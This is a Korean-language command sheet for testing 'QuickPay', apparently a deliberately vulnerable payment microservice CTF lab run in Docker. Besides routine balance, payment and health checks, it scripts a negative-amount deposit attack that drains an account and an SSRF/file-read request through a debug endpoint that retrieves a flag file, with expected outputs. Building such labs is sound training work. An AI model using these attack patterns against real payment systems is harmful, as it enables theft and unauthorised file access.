# QuickPay 테스트 명령어 모음

## 🔧 사전 준비

현재 Docker Compose가 실행 중입니다:
```bash
# 컨테이너 상태 확인
docker ps

# 특정 서비스 로그 확인
docker logs account
docker logs payment
docker logs settlement
```

---

## 1️⃣ 기본 기능 테스트

### 잔액 조회 (컨테이너 내부에서)
```bash
docker exec account python -c "
import requests
r = requests.get('http://localhost:5000/account/balance?user_id=user1')
print(f'잔액: {r.json()[\"balance\"]:,}원')
"
```

### 입금 테스트
```bash
docker exec account python -c "
import requests
r = requests.post(
    'http://localhost:5000/account/deposit',
    json={'user_id': 'user1', 'amount': 10000}
)
print(f'입금 결과: {r.status_code}')
r2 = requests.get('http://localhost:5000/account/balance?user_id=user1')
print(f'잔액: {r2.json()[\"balance\"]:,}원')
"
```

### 출금 테스트
```bash
docker exec account python -c "
import requests
r = requests.post(
    'http://localhost:5000/account/withdraw',
    json={'user_id': 'user1', 'amount': 5000}
)
print(f'출금 결과: {r.status_code}')
r2 = requests.get('http://localhost:5000/account/balance?user_id=user1')
print(f'잔액: {r2.json()[\"balance\"]:,}원')
"
```

---

## 2️⃣ CTF 취약점 테스트 (PDF 기준)

### 🚨 취약점 #1: 음수 입금 (PDF Page 14)

**설명**: 서버 사이드 검증 부재로 음수 금액 입금 가능

```bash
docker exec account python -c "
import requests

# 초기 잔액
r1 = requests.get('http://localhost:5000/account/balance?user_id=user1')
initial = r1.json()['balance']
print(f'[초기 잔액] {initial:,}원')

# 🚨 음수 입금 공격!
r2 = requests.post(
    'http://localhost:5000/account/deposit',
    json={'user_id': 'user1', 'amount': -50000}
)
print(f'[음수 입금] 응답 코드: {r2.status_code}')

# 최종 잔액
r3 = requests.get('http://localhost:5000/account/balance?user_id=user1')
final = r3.json()['balance']
print(f'[최종 잔액] {final:,}원')
print(f'[변화] {initial - final:,}원 출금됨!')
"
```

**예상 결과**:
```
[초기 잔액] 50,000원
[음수 입금] 응답 코드: 200
[최종 잔액] 0원
[변화] 50,000원 출금됨!
```

---

### 🚨 취약점 #2: SSRF (PDF Page 22)

**설명**: 계좌관리서비스의 debug API를 통해 정산서비스 내부 파일 읽기

```bash
docker exec account python -c "
import requests

print('[SSRF 공격 테스트]')
print()

# 일반 로그 파일
r1 = requests.get('http://localhost:5000/account/internal/debug?filename=access.log')
print('1. 일반 로그 파일:')
print(f'   {r1.text[:100]}...')
print()

# 🚨 FLAG 파일 읽기 공격!
r2 = requests.get('http://localhost:5000/account/internal/debug?filename=flag.txt')
print('2. FLAG 파일 공격:')
print(f'   {r2.text}')
"
```

**예상 결과**:
```
[SSRF 공격 테스트]

1. 일반 로그 파일:
   [정산서비스 로그] access.log 파일 내용...

2. FLAG 파일 공격:
   FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}
```

---

## 3️⃣ 결제 서비스 테스트 (Saga Pattern)

### 정상 결제 테스트

```bash
docker exec payment python -c "
import requests

# 잔액 복구
requests.post('http://account:5000/account/deposit', json={'user_id': 'user1', 'amount': 50000})

# 초기 잔액
r1 = requests.get('http://account:5000/account/balance?user_id=user1')
print(f'[초기 잔액] {r1.json()[\"balance\"]:,}원')

# 결제 (1,000원)
r2 = requests.post(
    'http://localhost:5000/payments',
    json={'user_id': 'user1', 'merchant_id': 'M001', 'amount': 1000}
)
print(f'[결제 응답] {r2.status_code} - {r2.text}')

# 최종 잔액
r3 = requests.get('http://account:5000/account/balance?user_id=user1')
print(f'[최종 잔액] {r3.json()[\"balance\"]:,}원')
"
```

**참고**: Settlement 서비스 DB 초기화 문제로 현재는 보상 트랜잭션(잔액 복구)만 확인 가능합니다.

---

## 4️⃣ 전체 시나리오 테스트

### 완전한 공격 시나리오

```bash
docker exec account python -c "
import requests

print('=== QuickPay CTF 공격 시나리오 ===')
print()

# 1단계: 계정 확인
print('[1단계] 계정 확인')
r = requests.get('http://localhost:5000/account/balance?user_id=user1')
print(f'   user1 잔액: {r.json()[\"balance\"]:,}원')
print()

# 2단계: 음수 입금 공격
print('[2단계] 음수 입금 공격')
requests.post('http://localhost:5000/account/deposit', json={'user_id': 'user1', 'amount': -50000})
r = requests.get('http://localhost:5000/account/balance?user_id=user1')
print(f'   공격 후 잔액: {r.json()[\"balance\"]:,}원')
print('   ✅ 50,000원 탈취 성공!')
print()

# 3단계: SSRF 공격
print('[3단계] SSRF 공격으로 FLAG 획득')
r = requests.get('http://localhost:5000/account/internal/debug?filename=flag.txt')
print(f'   {r.text}')
print('   ✅ FLAG 획득 성공!')
"
```

---

## 5️⃣ 서비스별 헬스체크

```bash
# Account Service
docker exec account python -c "import requests; print(requests.get('http://localhost:5000/health').json())"

# Payment Service
docker exec payment python -c "import requests; print(requests.get('http://localhost:5000/health').json())"

# Auth Service
docker exec auth python -c "import requests; print(requests.get('http://localhost:5000/health').json())"
```

---

## 6️⃣ 로그 모니터링

```bash
# 실시간 로그 보기
docker logs -f account

# 최근 로그만 보기
docker logs --tail 50 account
docker logs --tail 50 payment
docker logs --tail 50 settlement
```

---

## 🛑 종료

```bash
# 전체 서비스 중지
docker-compose down

# 볼륨까지 삭제
docker-compose down -v
```

---

## 📌 참고사항

- **API Gateway (포트 8080)**: 인증이 필요하므로 내부 테스트는 컨테이너 내부에서 진행
- **직접 서비스 접근**: `docker exec` 명령어로 컨테이너 내부에서 Python requests 사용
- **CTF 플래그**: `FLAG{SSRF_AND_LFI_VULNERABILITY_FOUND}`

---

## 🎯 빠른 테스트 (권장)

모든 취약점을 한 번에 테스트:

```bash
docker exec account python -c "
import requests

# 잔액 초기화
requests.post('http://localhost:5000/account/deposit', json={'user_id': 'user1', 'amount': 100000})

print('=== CTF 취약점 전체 테스트 ===\n')

# 취약점 #1
print('[취약점 #1] 음수 입금')
r1 = requests.get('http://localhost:5000/account/balance?user_id=user1')
print(f'  초기: {r1.json()[\"balance\"]:,}원')
requests.post('http://localhost:5000/account/deposit', json={'user_id': 'user1', 'amount': -50000})
r2 = requests.get('http://localhost:5000/account/balance?user_id=user1')
print(f'  최종: {r2.json()[\"balance\"]:,}원')
print(f'  결과: ✅ 음수 입금으로 출금 성공\n')

# 취약점 #2
print('[취약점 #2] SSRF')
r = requests.get('http://localhost:5000/account/internal/debug?filename=flag.txt')
print(f'  결과: {r.text}')
print(f'  결과: ✅ FLAG 획득 성공')
"
```
